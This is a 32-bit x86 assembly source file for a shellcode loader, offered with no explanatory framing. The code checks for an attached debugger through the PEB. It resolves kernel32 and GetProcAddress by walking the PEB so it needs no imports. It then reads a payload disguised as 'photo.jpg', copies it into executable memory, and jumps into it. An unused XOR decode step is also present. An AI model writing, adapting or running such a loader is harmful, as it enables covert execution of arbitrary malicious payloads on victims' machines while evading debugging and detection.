global StartMain

segment .rdata
aaaa db 'sss',0

segment .data USE32
	xorkey db 10h
	getFileSizeFuncName db 'GetFileSize',0
	shellcodePath9 db 'photo.jpg',0
	allocFuncName db 'VirtualAlloc',0
    createFileMappingAFuncName db 'CreateFileMappingA',0
	kernel32DllName db 'Kernel32.dll',0
	createFileFuncName db 'CreateFileA',0
	mapViewOfFileFuncName db 'MapViewOfFile',0
	virtualProtectFuncName db 'VirtualProtect',0

segment .text USE32
StartMain:
        ; show the message box
	; push MB_OK
	; push title
	; push message
	; push 0
	; call [MessageBoxA]

	; return control back to windows
        ; ----- debuger check
	push eax
	mov    eax,dword fs:[30h]
        movzx ecx,byte [eax+2]
        cmp ecx,1
        jz again
        jmp bye
        again:
        int 3
        bye:
        pop eax
	; ----- debuger check
	push ebp
	mov ebp,ebp
	sub esp,12
	call shellcode
	add esp,12
	mov esp,ebp
	pop ebp
	nop
	ret
GetAddrByName:
    push ebp
	mov ebp,esp
	sub esp,40h
	push eax
	call GetKernel32DLLBase
	mov dword [ebp - 4],eax
	pop eax
	push eax
	call GetProcAddrFuncAddr
	mov dword [ebp - 8],eax
	pop eax

	push dword [ebp+8]
	push dword [ebp - 4]
	call dword [ebp - 8]
	add esp,0x40
	mov esp,ebp
	pop ebp
	ret


GetProcAddrFuncAddr:
	push ebp
	mov ebp,esp
	sub esp,0x40
	pushad
	xor ecx, ecx
	mov eax, dword fs:[ecx + 30h] ; EAX = PEB
	mov eax, [eax + 12]     ; EAX = PEB->Ldr
	mov esi, [eax + 20]    ; ESI = PEB->Ldr.InMemOrder
	lodsd                    ; EAX = Second module
	xchg eax, esi            ; EAX = ESI, ESI = EAX
	lodsd                    ; EAX = Third(kernel32)
	mov ebx, [eax + 16]    ; EBX = Base address
	mov edx, [ebx + 60]    ; EDX = DOS->e_lfanew
	add edx, ebx             ; EDX = PE Header
	mov edx, [edx + 120]    ; EDX =  export table
	add edx, ebx             ; EDX = Export table
	mov esi, [edx + 32]    ; ESI =  namestable
	add esi, ebx             ; ESI = Names table
	xor ecx, ecx             ; EXC = 0
	Get_Function:
	inc ecx                              ; Increment the ordinal
	lodsd                                ; Get name 
	add eax, ebx                         ; Get function name
	cmp dword [eax], 50746547h       ; GetP
	jnz Get_Function
	cmp dword [eax + 4], 41636f72h ; rocA
	jnz Get_Function
	cmp dword [eax + 8], 65726464h ; ddre
	jnz Get_Function
	mov esi, [edx + 36]                ; ESI =  ordinals
	add esi, ebx                         ; ESI = Ordinals table
	mov cx, [esi + ecx * 2]              ; Number of function
	dec ecx
	mov esi, [edx + 28]                ;  address table
	add esi, ebx                         ; ESI = Address table
	mov edx, [esi + ecx * 4]             ; EDX = Pointer()
	add edx, ebx                         ; EDX = GetProcAddress
	mov eax,edx
	mov dword [ebp-4],eax
	popad
	mov eax,dword [ebp-4]
	add esp,0x40
	mov esp,ebp
	pop ebp
	ret


AddExecutePage:
	push ebp
	mov ebp,esp
	sub esp,0x40
	push eax
	push ebx
	push ecx
	push edx
	lea edx,dword [ebp-4]
	mov dword [ebp-12], eax
	mov dword [ebp-16], edx
	mov dword [ebp-20], ebx
	mov dword [ebp-8],virtualProtectFuncName
	push dword [ebp-8]
	call GetAddrByName
	add esp,4
	push dword [ebp-16]
	push 0x10                ; PAGE_EXECUTE
	push dword [ebp-12]
	push dword [ebp-20]
	call eax
	pop edx
	pop ecx
	pop ebx
	pop eax
	add esp,0x40
	mov esp,ebp
	pop ebp
	ret

GetKernel32DLLBase:
	xor eax,eax
	push esi
    mov eax, DWORD fs:[30h] ; EAX = PEB
	mov eax, [eax + 12]     ; EAX = PEB->Ldr
	mov esi, [eax + 20]    ; ESI = PEB->Ldr.InMemOrder
	lodsd                    ; EAX = Second module
	xchg eax, esi            ; EAX = ESI, ESI = EAX
	lodsd                    ; EAX = Third(kernel32)
	mov eax, [eax + 16]    ; EBX = Base address
	pop esi
	ret


shellcode:
        push ebx
        push ecx
        push edx
        push esi
        push ebp
        mov ebp,esp
        sub esp,0x40
        mov dword [ebp-4],createFileFuncName
        push dword [ebp-4]
        call GetAddrByName
        add esp,4

        mov esi, shellcodePath9
        push 0    ; 0
        push 0x80 ; FILE_ATTRIBUTE_NORMAL
        push 3    ; OPEN_EXISTING
        push 0    ; 0
        push 0x01 ; FILE_SHARE_READ
        push 0x80000000 ; GENERIC_READ
        push esi
        call eax
        push eax ; handle to a file

        mov dword [ebp-4], getFileSizeFuncName
        mov dword [ebp-8],eax ; handle to a file
        ; -------------------------------------------
        push dword [ebp-4]
        call GetAddrByName
        add esp,4
        ; -------------------------------------------

        push 0
        push dword [ebp-8] ; handle to a file
        mov ecx,dword [ebp-8] ; handle to a file
        call eax  ; GetFileSize
        ; -------------------------------------------
        mov ebx,eax ; file size
        pop ecx ; handle to a file
        mov dword [ebp-12],eax; file size
        mov edx,138240 ; FILE_MAP_START = 138240

        mov dword [ebp-4], createFileMappingAFuncName
        push dword [ebp-4]
        call GetAddrByName
        add esp,4


        push 0
        push dword [ebp-12] ;  file size
        push 0
        push 0x02
        push 0
        push dword [ebp-8] ;  handle to a file
        call eax ; handle of mapview
        
        mov dword [ebp-16],eax ; handle of mapview
        mov dword [ebp-4], mapViewOfFileFuncName
        push dword [ebp-4]
        call GetAddrByName
        add esp,4

        push dword [ebp-12]; file size
        push 0
        push 0
        push 0x0004
        push dword [ebp-16]
        call eax
        
        mov ecx, eax
        push ecx
        push  allocFuncName
        call GetAddrByName

        push 0x40
        push 0x00001000
        push ebx
        push 0
        call eax
        
        call AddExecutePage
        add esp,4
        pop ecx ; old memory location 
        
        
        push ebx ; ebx : file size 
        push ecx ; ecx : old memory location 
        push eax ; eax : new memory location to be copied to 
        push edx

        mov esi,0
loop9: ; Loop to copy the shellcode bytes manually
        cmp esi,ebx
        je end9
        mov dl,[ecx + esi]
        push ecx
        mov ecx,eax
        ;xor dl,xorkey ; xor key 10h , DEC =16
        mov [ecx + esi], dl ; ecx = eax = new memory
        pop ecx
        inc esi
        jmp loop9
        
end9: 
        pop edx
        pop eax
        pop ecx
        pop ebx
        call eax  ; calling the memory region  

        add esp,0x40
        pop esi 
        pop edx
        pop ecx
        pop ebx
        mov esp,ebp
        pop ebp
        ret

